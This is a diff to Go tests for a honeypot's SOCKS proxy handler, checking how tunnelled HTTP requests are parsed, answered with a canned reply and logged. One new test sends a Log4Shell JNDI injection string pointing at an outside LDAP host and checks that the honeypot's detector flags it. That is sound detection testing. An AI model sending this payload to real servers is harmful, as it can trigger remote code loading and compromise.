@@ -22,6 +22,19 @@ var socks4aHttpbin = []byte("\x04\x01\x00\x50\x00\x00\x00\x01\x00httpbin.org\x00
 
 var socksTunnelGET = []byte("GET /ip HTTP/1.1\r\nHost: httpbin.org\r\n\r\n")
 
+// requireJudgeHTTP checks the HTTP handler's frames for one GET /ip request
+// answered with the canned judge reply.
+func requireJudgeHTTP(t *testing.T, frames []parsedHTTP, judge []byte) {
+	t.Helper()
+	require.Len(t, frames, 2)
+	require.Equal(t, "read", frames[0].Direction)
+	require.Equal(t, "GET", frames[0].Command)
+	require.Empty(t, frames[0].SessionID, "tunnel frames are not session-grouped")
+	require.Equal(t, "write", frames[1].Direction)
+	require.Equal(t, "200", frames[1].Status)
+	require.Equal(t, judge, frames[1].Payload)
+}
+
 func startSOCKS(t *testing.T, maxPayload int) (net.Conn, *fakeHoneypot, chan error) {
 	t.Helper()
 	prevPort := socksBoundPort
@@ -82,11 +95,12 @@ func TestHandleSOCKS4aCapturedEvent(t *testing.T) {
 	require.Equal(t, judge, socksExchange(t, client, socksTunnelGET, len(judge)))
 
 	frames := finishSOCKS(t, client, hp, done)
+	tunnelHTTP := frames[len(frames)-1].HTTP
+	requireJudgeHTTP(t, tunnelHTTP, judge)
 	require.Equal(t, []parsedSOCKS{
 		{Direction: "read", Command: "socks4a-connect", Path: "httpbin.org:80", Version: 4, Host: "httpbin.org", Port: 80, Payload: socks4aHttpbin},
 		{Direction: "write", Command: "socks4a-connect", Status: "granted", Payload: granted},
-		{Direction: "read", Command: "tunnel", Path: "httpbin.org:80", Payload: socksTunnelGET, PayloadHash: helpers.SHA256Hex(socksTunnelGET), Requests: 1, DistinctRequests: 1, RequestLine: "GET /ip HTTP/1.1"},
-		{Direction: "write", Command: "tunnel", Status: "200", Payload: judge},
+		{Direction: "read", Command: "tunnel", Path: "httpbin.org:80", Payload: socksTunnelGET, PayloadHash: helpers.SHA256Hex(socksTunnelGET), Requests: 1, DistinctRequests: 1, RequestLine: "GET /ip HTTP/1.1", HTTP: tunnelHTTP},
 	}, frames)
 }
 
@@ -114,13 +128,14 @@ func TestHandleSOCKS5NoAuth(t *testing.T) {
 	require.Equal(t, judge, socksExchange(t, client, socksTunnelGET, len(judge)))
 
 	frames := finishSOCKS(t, client, hp, done)
+	tunnelHTTP := frames[len(frames)-1].HTTP
+	requireJudgeHTTP(t, tunnelHTTP, judge)
 	require.Equal(t, []parsedSOCKS{
 		{Direction: "read", Command: "socks5-greeting", Version: 5, Methods: []int{0}, Payload: []byte{0x05, 0x01, 0x00}},
 		{Direction: "write", Command: "socks5-greeting", Status: "no-auth", Payload: []byte{0x05, 0x00}},
 		{Direction: "read", Command: "socks5-connect", Path: "httpbin.org:80", Version: 5, Host: "httpbin.org", Port: 80, Payload: connect},
 		{Direction: "write", Command: "socks5-connect", Status: "granted", Payload: granted},
-		{Direction: "read", Command: "tunnel", Path: "httpbin.org:80", Payload: socksTunnelGET, PayloadHash: helpers.SHA256Hex(socksTunnelGET), Requests: 1, DistinctRequests: 1, RequestLine: "GET /ip HTTP/1.1"},
-		{Direction: "write", Command: "tunnel", Status: "200", Payload: judge},
+		{Direction: "read", Command: "tunnel", Path: "httpbin.org:80", Payload: socksTunnelGET, PayloadHash: helpers.SHA256Hex(socksTunnelGET), Requests: 1, DistinctRequests: 1, RequestLine: "GET /ip HTTP/1.1", HTTP: tunnelHTTP},
 	}, frames)
 }
 
@@ -192,8 +207,7 @@ func TestHandleSOCKS5TLSJudge(t *testing.T) {
 	require.NotEmpty(t, frames[5].Payload)
 	require.Equal(t, "tunnel", frames[6].Command)
 	require.Equal(t, req, frames[6].Payload)
-	require.Equal(t, "200", frames[7].Status)
-	require.Equal(t, judge, frames[7].Payload)
+	requireJudgeHTTP(t, frames[6].HTTP, judge)
 	require.NotNil(t, ev.tls)
 	require.Equal(t, "api.ipinfo.io", ev.tls.ServerName)
 }
@@ -228,7 +242,7 @@ func TestHandleSOCKS5TLSJudgeIcanhazip(t *testing.T) {
 	require.True(t, ok)
 	require.Equal(t, "ipv4.icanhazip.com:443", frames[2].Path)
 	require.Equal(t, "ipv4.icanhazip.com", frames[4].SNI)
-	require.Equal(t, "200", frames[7].Status)
+	requireJudgeHTTP(t, frames[6].HTTP, judge)
 	require.NotNil(t, ev.tls)
 	require.Equal(t, "ipv4.icanhazip.com", ev.tls.ServerName)
 }
@@ -395,4 +409,32 @@ func TestHandleSOCKS4aMissingHostDisconnect(t *testing.T) {
 	frames := finishSOCKS(t, client, hp, done)
 	require.Len(t, frames, 1)
 	require.True(t, frames[0].Truncated)
+}
+
+// Pipelined requests in one tunnel read go through the HTTP handler: each is
+// decoded (detectors included) and answered, and the frames ride in the socks
+// event instead of a second one.
+func TestHandleSOCKSTunnelHTTPHandoff(t *testing.T) {
+	client, hp, done := startSOCKS(t, 4096)
+
+	granted := []byte{0x00, 0x5a, 0x9c, 0x40, 0, 0, 0, 0}
+	require.Equal(t, granted, socksExchange(t, client, socks4aHttpbin, 8))
+	pipelined := append(append([]byte{}, socksTunnelGET...),
+		"GET /?q=${jndi:ldap://203.0.113.9/a} HTTP/1.1\r\nHost: httpbin.org\r\n\r\n"...)
+	judge := socks.TunnelHTTPReply()
+	got := socksExchange(t, client, pipelined, 2*len(judge))
+	require.Equal(t, append(append([]byte{}, judge...), judge...), got)
+
+	frames := finishSOCKS(t, client, hp, done)
+	require.Len(t, frames, 3, "one tunnel read frame; replies live in its http frames")
+	tunnel := frames[2]
+	require.Equal(t, "tunnel", tunnel.Command)
+	require.Equal(t, 2, tunnel.Requests)
+	require.Len(t, tunnel.HTTP, 4)
+	require.Equal(t, []string{"read", "write", "read", "write"}, []string{
+		tunnel.HTTP[0].Direction, tunnel.HTTP[1].Direction, tunnel.HTTP[2].Direction, tunnel.HTTP[3].Direction,
+	})
+	require.Nil(t, tunnel.HTTP[0].Log4Shell)
+	require.NotNil(t, tunnel.HTTP[2].Log4Shell)
+	require.Equal(t, "write", frames[1].Direction)
 }
